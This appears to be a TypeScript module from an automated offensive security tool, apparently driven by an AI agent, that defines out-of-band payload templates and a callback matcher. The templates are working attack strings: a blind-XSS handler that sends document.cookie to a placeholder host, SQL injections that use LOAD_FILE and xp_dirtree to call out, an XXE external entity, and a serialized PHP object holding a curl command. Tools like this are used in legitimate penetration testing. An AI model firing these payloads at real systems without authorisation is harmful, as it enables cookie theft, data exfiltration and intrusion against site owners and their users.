// src/oast/categories.ts
//
// OOBCategory — the 5 OOB categories the menace loop supports.
// The category determines which OOB payload template is used and
// how callbacks are scored as evidence.

export type OOBCategory = 'ssrf' | 'blind-xss' | 'blind-sqli' | 'xxe' | 'deserialization';

export const OOB_CATEGORIES: readonly OOBCategory[] = ['ssrf', 'blind-xss', 'blind-sqli', 'xxe', 'deserialization'] as const;

/** Per-category payload templates. The agent customises the host:port placeholder. */
export const OOB_TEMPLATES: Record<OOBCategory, readonly string[]> = {
  'ssrf': [
    'http://{host}/{uuid}/ssrf',
    'http://{host}/{uuid}/ssrf.png',
  ],
  'blind-xss': [
    '<script src="http://{host}/{uuid}/x.js"></script>',
    '<img src="http://{host}/{uuid}/x.png" onerror="fetch(\'http://{host}/{uuid}/x?c=\'+document.cookie)">',
    '"><script src="http://{host}/{uuid}/x.js"></script>',
  ],
  'blind-sqli': [
    "' UNION SELECT (LOAD_FILE(concat('http://{host}/{uuid}/sqli-', version()))))-- ",
    "1; EXEC xp_dirtree '\\\\{host}\\{uuid}\\sqli'-- ",
    "'; DECLARE @x varchar(8000); SET @x=':'; EXEC master..xp_dirtree '\\\\{host}\\{uuid}\\' ,1,1;--",
  ],
  'xxe': [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{host}/{uuid}/xxe">]><foo>&xxe;</foo>`,
  ],
  'deserialization': [
    'O:8:"stdClass":1:{s:3:"cmd";s:7:"curl http://{host}/{uuid}/deser";}',  // PHP stdClass
    'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0{{"a":"http://{host}/{uuid}/deser"}}',  // Java ArrayList (illustrative)
  ],
} as const;

/** A registered OOB probe: which UUID we registered, which URL the agent inserted into a payload, and which category. */
export interface OOBProbe {
  uuid: string;
  url: string;
  category: OOBCategory;
  /** Endpoint + param that the payload was injected into. */
  endpoint: string;
  param: string;
  /** Original payload that contained the URL. */
  payload: string;
  registeredAt: number;
}

/** Score a callback against registered probes. Returns matched probes. */
export function matchCallback(uuid: string, probes: OOBProbe[]): OOBProbe[] {
  return probes.filter((p) => p.uuid === uuid);
}
